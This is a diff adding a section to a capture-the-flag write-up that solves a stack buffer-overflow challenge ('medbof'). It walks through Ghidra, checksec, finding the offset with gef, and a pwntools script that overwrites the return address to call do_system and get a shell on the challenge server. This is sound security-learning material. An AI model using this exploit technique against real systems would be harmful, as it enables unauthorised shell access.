@@ -70,6 +70,81 @@ io.interactive()
 
 
 
+## The Second Chall `Easy` XD
+<img src="https://github.com/q5fj/Pwn/assets/88992167/3d7cf3fc-5b94-4b7f-89a8-f68d00d31dbc">
+
+#### Using The `Ghidra` Tool,
+#### We Find That The `main` Funcition Calls The `do_input` Function
+<img src="https://github.com/q5fj/Pwn/assets/88992167/d1baf018-10bc-49b3-9b4d-c43856a1009c">
+<img src="https://github.com/q5fj/Pwn/assets/88992167/42c6ea4d-b197-48e2-8fff-b9e8d5971dba">
+
+#### Check The Program `file medbof`
+<img src="https://github.com/q5fj/Pwn/assets/88992167/9ede44ab-2423-48ca-bc8e-2e4139d7021b">
+
+#### Check teh security of the Program `checksec medbof`
+<img src="https://github.com/q5fj/Pwn/assets/88992167/24a1caf7-c570-4bbe-96ad-9c928bf91375">
+
+#### Run The Program `./medbof`
+<img src="https://github.com/q5fj/Pwn/assets/88992167/d7d6ce96-ebf1-49c1-917a-d6ae1fcf1ac5">
+
+#### Verify The Program Using `gdb ./medbof`
+<img src="https://github.com/q5fj/Pwn/assets/88992167/91d4adeb-c9b1-43e0-883c-590b6da00a7d">
+
+#### The Vulnerability exists in `do_input` and `do_system` with `bin/sh` :)
+<img src="https://github.com/q5fj/Pwn/assets/88992167/41877e76-c681-4d0d-8cf4-9f1b10ba5d36">
+
+#### Extract The Offset 
+```
+gef➤  pattern create 100
+gef➤  r
+gef➤  pattern offset faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala
+```
+<img src="https://github.com/q5fj/Pwn/assets/88992167/89e6d54d-1775-41bc-8baf-9d2d7b792883">
+
+#### Create Exploitation Program `PwnTools`
+```
+import shutup; shutup.please()
+from pwn import * 
+
+elf = context.binary = ELF('./medbof')
+io = elf.process()
+#libc = elf.libc
+
+io = remote('0.cloud.chals.io', 27380)
+
+context.log_level = 'debug'
+
+offset = 40
+
+payload = b''
+payload += b'A' * offset
+payload += p64(0x400657) + p64(0x400646) #Addres do_input + Adders do_system
+
+#io.recvline()
+io.sendlineafter(b'time',payload)
+io.interactive()
+```
+<img src="https://github.com/q5fj/Pwn/assets/88992167/739f5684-3ffb-498f-a3b0-4bcf0c5141b0">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
